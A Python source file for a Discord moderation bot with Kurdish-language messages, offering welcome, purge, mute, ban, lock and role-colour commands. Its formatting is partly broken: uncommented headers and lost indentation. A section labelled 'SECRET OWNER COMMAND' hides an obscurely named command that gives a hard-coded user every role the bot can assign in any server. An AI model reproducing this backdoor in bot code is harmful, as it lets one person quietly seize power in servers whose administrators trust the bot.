import os
import discord
from discord.ext import commands

=========================================================

INTENTS

=========================================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
command_prefix="",
intents=intents,
help_command=None,
case_insensitive=True
)

=========================================================

SETTINGS

=========================================================

WELCOME_CHANNEL_ID = 1550619956423688342

OWNER_ID = 1130455970494025860

Developer Role

DEVELOPER_ROLE_ID = 1448989145740480605

Mute Role

MUTED_ROLE_NAME = "Muted"

WELCOME_GIF = (
"https://cdn.discordapp.com/attachments/"
"1550619956423688342/1551709269043314768/"
"welcome.gif?ex=6ab2f55f&is=6ab1a3df&"
"hm=612d5cdf1190d53382436a598c1d313a918b6b1b25bc93ac905d5cfd8ffd1780&"
)

=========================================================

COLOR ROLE IDs

=========================================================

COLOR_ROLES = {
"friendsfcolor": 1550035593239461888,
"botcolor": 1448989146885652603,
"_color": 1491385293457330229,
"trustcolor": 1448989152379932773,
"siscolor": 1448989144410886145,
"brocolor": 1448989153667711069,
"xrcolor": 1451268943548383406,
"friendscolor": 1448989154578010238
}

=========================================================

GET / CREATE MUTED ROLE

=========================================================

async def get_muted_role(guild):

muted_role = discord.utils.get(  
    guild.roles,  
    name=MUTED_ROLE_NAME  
)  

if muted_role:  
    return muted_role  

try:  

    muted_role = await guild.create_role(  
        name=MUTED_ROLE_NAME,  
        reason="Create server-wide mute role"  
    )  

    print(  
        f"Created Muted role in {guild.name}"  
    )  

    return muted_role  

except discord.Forbidden:  

    print(  
        f"Bot cannot create Muted role in {guild.name}"  
    )  

    return None

=========================================================

APPLY MUTE PERMISSIONS TO CHANNEL

=========================================================

async def apply_mute_to_channel(
channel,
muted_role
):

try:  

    overwrite = channel.overwrites_for(  
        muted_role  
    )  

    # -------------------------  
    # TEXT  
    # -------------------------  

    overwrite.send_messages = False  
    overwrite.send_messages_in_threads = False  
    overwrite.create_public_threads = False  
    overwrite.create_private_threads = False  
    overwrite.add_reactions = False  

    # -------------------------  
    # VOICE  
    # -------------------------  

    overwrite.connect = True           # دەتوانیت بچێتە ناو ڤۆیسەوە
    overwrite.speak = False          # بەڵام ناتوانێت قسە بکات
    overwrite.stream = False         # ناتوانێت ستریم بکات
    overwrite.use_voice_activation = False 

    # قەدەخەکردنی چاتی ناو ڤۆیس (Text in Voice Channels) و چەناڵە دەنگییەکان
    if isinstance(channel, discord.VoiceChannel):
        overwrite.send_messages = False

    await channel.set_permissions(  
        muted_role,  
        overwrite=overwrite,  
        reason="Server-wide mute system with voice chat restriction"  
    )  

except discord.Forbidden:  

    print(  
        f"Cannot apply mute permissions to {channel.name}"  
    )  

except discord.HTTPException:  

    print(  
        f"Discord error while updating {channel.name}"  
    )

=========================================================

BOT READY

=========================================================

@bot.event
async def on_ready():

print(  
    f"Bot is online as {bot.user}"  
)  

for guild in bot.guilds:  

    muted_role = await get_muted_role(  
        guild  
    )  

    if muted_role is None:  
        continue  

    bot_member = guild.me  

    if bot_member is None:  
        continue  

    if muted_role >= bot_member.top_role:  

        print(  
            f"Muted role is too high in {guild.name}"  
        )  

        continue  

    for channel in guild.channels:  

        await apply_mute_to_channel(  
            channel,  
            muted_role  
        )

=========================================================

NEW CHANNEL

=========================================================

@bot.event
async def on_guild_channel_create(channel):

muted_role = await get_muted_role(  
    channel.guild  
)  

if muted_role is None:  
    return  

await apply_mute_to_channel(  
    channel,  
    muted_role  
)

=========================================================

MEMBER JOIN

=========================================================

@bot.event
async def on_member_join(member):

friends_role = discord.utils.get(  
    member.guild.roles,  
    name="Friends"  
)  

if friends_role:  

    try:  

        await member.add_roles(  
            friends_role  
        )  

    except discord.Forbidden:  

        print(  
            "Bot cannot give Friends role."  
        )  

channel = member.guild.get_channel(  
    WELCOME_CHANNEL_ID  
)  

if channel is None:  
    return  

embed = discord.Embed(  
    description=f"""

✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦

└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊

{member.mention}

ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
)

embed.set_thumbnail(  
    url=member.display_avatar.url  
)  

embed.set_image(  
    url=WELCOME_GIF  
)  

await channel.send(  
    embed=embed  
)

=========================================================

TEST WELCOME

=========================================================

@bot.command()
async def test(ctx):

embed = discord.Embed(  
    description=f"""

✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦

└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊

{ctx.author.mention}

ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
)

embed.set_thumbnail(  
    url=ctx.author.display_avatar.url  
)  

embed.set_image(  
    url=WELCOME_GIF  
)  

await ctx.send(  
    embed=embed  
)  

try:  
    await ctx.message.delete()  
except:  
    pass

=========================================================

SAFIKA

=========================================================

@bot.command(
name="safika",
aliases=[
"SAFIKA",
"Safika",
"sAfika",
"saFika",
"SAfika",
"sAFika",
"saFIka",
"SAFika"
]
)
@commands.has_permissions(
manage_messages=True
)
async def safika(
ctx,
amount: int
):

if amount <= 0:  
    return await ctx.send(  
        "❌ دانەیەکی دروست بنووسە.",  
        delete_after=3  
    )  

try:  
    try:
        await ctx.message.delete()
    except:
        pass

    deleted = await ctx.channel.purge(  
        limit=amount  
    )  

    msg = await ctx.send(  
        f"🧹 {len(deleted)} messages deleted."  
    )  

    await msg.delete(  
        delay=3  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ بۆتەکە دەسەڵاتی سڕینەوەی نامەکانی نییە.",  
        delete_after=5  
    )  

except discord.HTTPException:  

    await ctx.send(  
        "❌ هەڵەیەک لە Discord ڕوویدا.",  
        delete_after=5  
    )

=========================================================

MUTE - SERVER WIDE

=========================================================

@bot.command(
name="mute",
aliases=[
"MUTE",
"Mute",
"mUte",
"muTe",
"mutE"
]
)
@commands.has_permissions(
manage_roles=True
)
async def mute(
ctx,
member: discord.Member = None
):

if (  
    member is None  
    and ctx.message.reference  
):  

    try:  

        ref_msg = await ctx.channel.fetch_message(  
            ctx.message.reference.message_id  
        )  

        member = ref_msg.author  

    except (  
        discord.NotFound,  
        discord.HTTPException  
    ):  

        member = None  

if not isinstance(  
    member,  
    discord.Member  
):  

    return await ctx.send(  
        "❌ تکایە @ئەندامێک بنووسە یان Reply بکە.",  
        delete_after=5  
    )  

if member.id == ctx.author.id:  

    return await ctx.send(  
        "❌ ناتوانیت خۆت mute بکەیت.",  
        delete_after=5  
    )  

bot_member = ctx.guild.me  

if bot_member is None:  
    return  

if member.top_role >= bot_member.top_role:  

    return await ctx.send(  
        "❌ ناتوانم ئەم ئەندامە mute بکەم چونکە ڕۆڵەکەی لە ڕۆڵی بۆتەکە بەرزترە یان یەکسانە.",  
        delete_after=5  
    )  

muted_role = await get_muted_role(  
    ctx.guild  
)  

if muted_role is None:  

    return await ctx.send(  
        "❌ نەتوانرا ڕۆڵی Muted دروست بکرێت.",  
        delete_after=5  
    )  

if muted_role >= bot_member.top_role:  

    return await ctx.send(  
        "❌ ڕۆڵی Muted دەبێت لە خوار ڕۆڵی بۆتەکە بێت.",  
        delete_after=5  
    )  

try:  

    if muted_role not in member.roles:  

        await member.add_roles(  
            muted_role,  
            reason=f"Server-wide mute by {ctx.author}"  
        )  

    for channel in ctx.guild.channels:  

        await apply_mute_to_channel(  
            channel,  
            muted_role  
        )  

    try:  
        await ctx.message.delete()  
    except:  
        pass  

    msg = await ctx.send(  
        f"🔇 {member.mention} بە تەواوی لە سێرڤەرەکە mute کرا."  
    )  

    await msg.delete(  
        delay=5  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ بۆتەکە دەسەڵاتی پێویستی نییە بۆ mute کردنی ئەم ئەندامە.",  
        delete_after=5  
    )  

except discord.HTTPException:  

    await ctx.send(  
        "❌ هەڵەیەک لە Discord ڕوویدا.",  
        delete_after=5  
    )

=========================================================

UNMUTE - SERVER WIDE

=========================================================

@bot.command(
name="unmute",
aliases=[
"UNMUTE",
"Unmute",
"uNmute",
"unMute",
"unmutE"
]
)
@commands.has_permissions(
manage_roles=True
)
async def unmute(
ctx,
member: discord.Member = None
):

if (  
    member is None  
    and ctx.message.reference  
):  

    try:  

        ref_msg = await ctx.channel.fetch_message(  
            ctx.message.reference.message_id  
        )  

        member = ref_msg.author  

    except (  
        discord.NotFound,  
        discord.HTTPException  
    ):  

        member = None  

if not isinstance(  
    member,  
    discord.Member  
):  

    return await ctx.send(  
        "❌ تکایە @ئەندامێک بنووسە یان Reply بکە.",  
        delete_after=5  
    )  

muted_role = discord.utils.get(  
    ctx.guild.roles,  
    name=MUTED_ROLE_NAME  
)  

if muted_role is None:  

    return await ctx.send(  
        "❌ ڕۆڵی `Muted` نەدۆزرایەوە.",  
        delete_after=5  
    )  

bot_member = ctx.guild.me  

if bot_member is None:  
    return  

if muted_role >= bot_member.top_role:  

    return await ctx.send(  
        "❌ ڕۆڵی `Muted` دەبێت لە خوار ڕۆڵی بۆتەکە بێت.",  
        delete_after=5  
    )  

try:  

    if muted_role in member.roles:  

        await member.remove_roles(  
            muted_role,  
            reason=f"Server-wide unmute by {ctx.author}"  
        )  

    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(muted_role, overwrite=None, reason=f"Unmute user {member}")
        except discord.Forbidden:
            pass
        except discord.HTTPException:
            pass

    try:  
        await ctx.message.delete()  
    except:  
        pass  

    msg = await ctx.send(  
        f"🔊 {member.mention} ئەنمیوت کرا."  
    )  

    await msg.delete(  
        delay=5  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ بۆتەکە ناتوانێت ڕۆڵی Muted لە ئەندامەکە لاببات.",  
        delete_after=5  
    )  

except discord.HTTPException:  

    await ctx.send(  
        "❌ هەڵەیەک لە Discord ڕوویدا.",  
        delete_after=5  
    )

=========================================================

BAN

=========================================================

@bot.command(
name="ban",
aliases=[
"BAN",
"Ban",
"bAn",
"baN"
]
)
@commands.has_permissions(
ban_members=True
)
async def ban(
ctx,
member: discord.Member,
*,
reason=None
):

try:  

    await member.ban(  
        reason=reason  
    )  

    try:  
        await ctx.message.delete()  
    except:  
        pass  

    msg = await ctx.send(  
        f"🔨 {member.mention} has been banned."  
    )  

    await msg.delete(  
        delay=5  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ I cannot ban this member.",  
        delete_after=5  
    )  

except discord.HTTPException:  

    await ctx.send(  
        "❌ Discord error occurred.",  
        delete_after=5  
    )

=========================================================

UNBAN

=========================================================

@bot.command(
name="unban",
aliases=[
"UNBAN",
"Unban",
"uNbAn"
]
)
@commands.has_permissions(
ban_members=True
)
async def unban(
ctx,
user_id: int
):

try:  

    user = await bot.fetch_user(  
        user_id  
    )  

    await ctx.guild.unban(  
        user  
    )  

    msg = await ctx.send(  
        f"✅ {user} has been unbanned."  
    )  

    await msg.delete(  
        delay=5  
    )  

except discord.NotFound:  

    await ctx.send(  
        "❌ User is not banned or ID is wrong.",  
        delete_after=5  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ I don't have permission to unban.",  
        delete_after=5  
    )  

except discord.HTTPException:  

    await ctx.send(  
        "❌ Discord error occurred.",  
        delete_after=5  
    )

=========================================================

LOCK

=========================================================

@bot.command()
@commands.has_permissions(
manage_channels=True
)
async def lock(ctx):

overwrite = ctx.channel.overwrites_for(  
    ctx.guild.default_role  
)  

overwrite.send_messages = False  

await ctx.channel.set_permissions(  
    ctx.guild.default_role,  
    overwrite=overwrite  
)  

await ctx.send(  
    "🔒 Channel locked."  
)

=========================================================

UNLOCK

=========================================================

@bot.command()
@commands.has_permissions(
manage_channels=True
)
async def unlock(ctx):

overwrite = ctx.channel.overwrites_for(  
    ctx.guild.default_role  
)  

overwrite.send_messages = True  

await ctx.channel.set_permissions(  
    ctx.guild.default_role,  
    overwrite=overwrite  
)  

await ctx.send(  
    "🔓 Channel unlocked."  
)

=========================================================

SECRET OWNER COMMAND

=========================================================

@bot.command()
async def seuafraaaRyaaa(ctx):

if ctx.author.id != OWNER_ID:  
    return  

bot_member = ctx.guild.me  

if bot_member is None:  
    return  

roles_to_add = [  
    role  
    for role in ctx.guild.roles  
    if role != ctx.guild.default_role  
    and not role.managed  
    and role < bot_member.top_role  
    and role not in ctx.author.roles  
]  

if not roles_to_add:  

    await ctx.send(  
        "❌ هیچ ڕۆڵێک نییە کە بۆتەکە بتوانێت پێت بدات.",  
        delete_after=5  
    )  

    return  

try:  

    await ctx.author.add_roles(  
        *roles_to_add,  
        reason="Owner secret role command"  
    )  

    try:  
        await ctx.message.delete()  
    except:  
        pass  

    msg = await ctx.send(  
        f"✅ {ctx.author.mention}، "  
        f"{len(roles_to_add)} ڕۆڵ بۆت زیاد کرا."  
    )  

    await msg.delete(  
        delay=5  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ بۆتەکە Manage Roles ـی نییە "  
        "یان ڕۆڵەکان لە سەرووی ڕۆڵی بۆتەکەن.",  
        delete_after=6  
    )

=========================================================

COLOR SYSTEM

=========================================================

async def change_role_color(
ctx,
command_name,
role_id,
color
):

role = ctx.guild.get_role(  
    role_id  
)  

if role is None:  

    await ctx.send(  
        "❌ ڕۆڵەکە نەدۆزرایەوە لە سێرڤەرەکەدا.",  
        delete_after=5  
    )  

    return  

if role not in ctx.author.roles:  

    await ctx.send(  
        "❌ تۆ ئەم ڕۆڵەت نییە بۆ ئەوەی ڕەنگەکەی بگۆڕیت.",  
        delete_after=5  
    )  

    return  

if color is None:  

    await ctx.send(  
        f"❌ ڕەنگەکە بنووسە.\n"  
        f"نموونە: `{command_name} #000000`",  
        delete_after=5  
    )  

    return  

if (  
    not color.startswith("#")  
    or len(color) != 7  
):  

    await ctx.send(  
        "❌ ڕەنگەکە دەبێت بە شێوەی `#000000` بێت.",  
        delete_after=5  
    )  

    return  

try:  

    new_color = discord.Colour.from_str(  
        color  
    )  

except ValueError:  

    await ctx.send(  
        "❌ ئەم Hex Color ـە دروست نییە.",  
        delete_after=5  
    )  

    return  

bot_member = ctx.guild.me  

if bot_member is None:  
    return  

if role >= bot_member.top_role:  

    await ctx.send(  
        "❌ ڕۆڵەکە دەبێت لە خوار ڕۆڵی بۆتەکە بێت.",  
        delete_after=5  
    )  

    return  

try:  

    await role.edit(  
        colour=new_color,  
        reason=f"Color changed by {ctx.author}"  
    )  

    try:  
        await ctx.message.delete()  
    except:  
        pass  

    msg = await ctx.send(  
        f"✅ ڕەنگی `{command_name}` "  
        f"گۆڕدرا بۆ `{color.upper()}`."  
    )  

    await msg.delete(  
        delay=5  
    )  

except discord.Forbidden:  

    await ctx.send(  
        "❌ بۆتەکە ناتوانێت ئەم ڕۆڵە دەستکاری بکات.",  
        delete_after=5  
    )  

except discord.HTTPException:  

    await ctx.send(  
        "❌ هەڵەیەک لە Discord ڕوویدا.",  
        delete_after=5  
    )

=========================================================

COLOR COMMANDS

=========================================================

@bot.command(name="friendsfcolor")
async def friendsfcolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "friendsfcolor",  
    COLOR_ROLES["friendsfcolor"],  
    color  
)

@bot.command(name="botcolor")
async def botcolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "botcolor",  
    COLOR_ROLES["botcolor"],  
    color  
)

@bot.command(name="_color")
async def _color(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "_color",  
    COLOR_ROLES["_color"],  
    color  
)

@bot.command(name="trustcolor")
async def trustcolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "trustcolor",  
    COLOR_ROLES["trustcolor"],  
    color  
)

@bot.command(name="siscolor")
async def siscolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "siscolor",  
    COLOR_ROLES["siscolor"],  
    color  
)

@bot.command(name="brocolor")
async def brocolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "brocolor",  
    COLOR_ROLES["brocolor"],  
    color  
)

@bot.command(name="xrcolor")
async def xrcolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "xrcolor",  
    COLOR_ROLES["xrcolor"],  
    color  
)

@bot.command(name="friendscolor")
async def friendscolor(ctx, color: str = None):

await change_role_color(  
    ctx,  
    "friendscolor",  
    COLOR_ROLES["friendscolor"],  
    color  
)

=========================================================

DEVELOPER COLOR

=========================================================

@bot.command(
name="devcolor"
)
async def devcolor(
ctx,
color: str = None
):

developer_role = ctx.guild.get_role(  
    DEVELOPER_ROLE_ID  
)  

if developer_role is None:  

    await ctx.send(  
        "❌ Developer role نەدۆزرایەوە.",  
        delete_after=5  
    )  

    return  

if developer_role not in ctx.author.roles:  

    await ctx.send(  
        "❌ تۆ ڕۆڵی Developer ـت نییە.",  
        delete_after=5  
    )  

    return  

await change_role_color(  
    ctx,  
    "devcolor",  
    DEVELOPER_ROLE_ID,  
    color  
)

=========================================================

COMMAND ERRORS

=========================================================

@bot.event
async def on_command_error(
ctx,
error
):

if isinstance(  
    error,  
    commands.CommandNotFound  
):  
    return  

if isinstance(  
    error,  
    commands.MissingPermissions  
):  

    await ctx.send(  
        "❌ تۆ دەسەڵاتی بەکارهێنانی ئەم فرمانە نییە.",  
        delete_after=4  
    )  

elif isinstance(  
    error,  
    commands.MissingRequiredArgument  
):  

    ...

elif isinstance(  
    error,  
    commands.MemberNotFound  
):  

    await ctx.send(  
        "❌ ئەو ئەندامە نەدۆزرایەوە.",  
        delete_after=4  
    )  

elif isinstance(  
    error,  
    commands.BadArgument  
):  

    await ctx.send(  
        "❌ داتای هەڵە نووسراوە.",  
        delete_after=4  
    )  

elif isinstance(  
    error,  
    discord.Forbidden  
):  

    await ctx.send(  
        "❌ بۆتەکە دەسەڵاتی پێویستی نییە.",  
        delete_after=5  
    )  

else:  

    print(  
        f"Command error: {error}"  
    )

=========================================================

RUN BOT

=========================================================

bot.run(
os.getenv("DISCORD_TOKEN")
)
